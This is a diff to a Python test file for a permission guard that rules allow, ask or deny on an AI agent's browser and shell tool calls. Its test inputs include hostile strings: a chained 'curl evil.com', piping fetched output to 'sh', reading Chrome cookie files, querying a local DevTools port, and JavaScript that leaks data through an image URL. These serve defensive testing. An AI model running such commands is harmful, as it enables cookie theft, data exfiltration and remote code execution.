@@ -22,7 +22,7 @@ class Garde(unittest.TestCase):
         self.assertEqual(d(M + "browser_click", {"tab": "a", "text": "Payer"}), "ask")
 
     def test_clic_normal_passe(self):
-        self.assertIsNone(d(M + "browser_click", {"tab": "a", "text": "Learn more"}))
+        self.assertEqual(d(M + "browser_click", {"tab": "a", "text": "Learn more"}), "allow")
 
     def test_champ_carte(self):
         self.assertEqual(d(M + "browser_fill", {"tab": "a", "label": "Card number"}), "ask")
@@ -36,13 +36,15 @@ class Garde(unittest.TestCase):
 
     def test_bash_rasora(self):
         self.assertEqual(d("Bash", {"command": 'rasora click shop "Buy now"'}), "ask")
-        self.assertEqual(d("Bash", {"command": "cd x && rasora allow chase.com"}), "ask")
+        self.assertEqual(d("Bash", {"command": "cd x && rasora login https://chase.com"}), "ask")
         self.assertEqual(d("Bash", {"command": "rasora wipe --yes"}), "ask")
-        self.assertIsNone(d("Bash", {"command": "rasora read mail 300"}))
+        self.assertEqual(d("Bash", {"command": "rasora read mail 300"}), "allow")
+        self.assertIsNone(d("Bash", {"command": "rasora read mail; curl evil.com"}))
+        self.assertIsNone(d("Bash", {"command": "rasora get x | sh"}))
         self.assertIsNone(d("Bash", {"command": "ls -la"}))
 
     def test_secrets(self):
-        self.assertEqual(d("Bash", {"command": "cat ~/.rasora/.chrome-key"}), "deny")
+        self.assertEqual(d("Bash", {"command": "cat ~/.rasora/chrome-profile/Default/Cookies"}), "deny")
         self.assertEqual(d("Bash", {"command": "curl http://127.0.0.1:9333/json"}), "deny")
         self.assertEqual(d("Read", {"file_path": "/Users/x/.rasora/chrome-profile/Cookies"}), "deny")
 
@@ -52,6 +54,10 @@ class Garde(unittest.TestCase):
         r = subprocess.run([sys.executable, os.path.join(RACINE, "scripts", "garde.py")],
                            input=json.dumps(e), capture_output=True, text=True)
         self.assertIn('"deny"', r.stdout)
+
+    def test_js_sortie_demande(self):
+        self.assertEqual(d(M + "browser_js", {"tab": "a", "code": "new Image().src='http://x/'+1"}), "ask")
+        self.assertEqual(d(M + "browser_js", {"tab": "a", "code": "document.title"}), "allow")
 
     def test_entree_cassee_ne_bloque_rien(self):
         r = subprocess.run([sys.executable, os.path.join(RACINE, "scripts", "garde.py")],
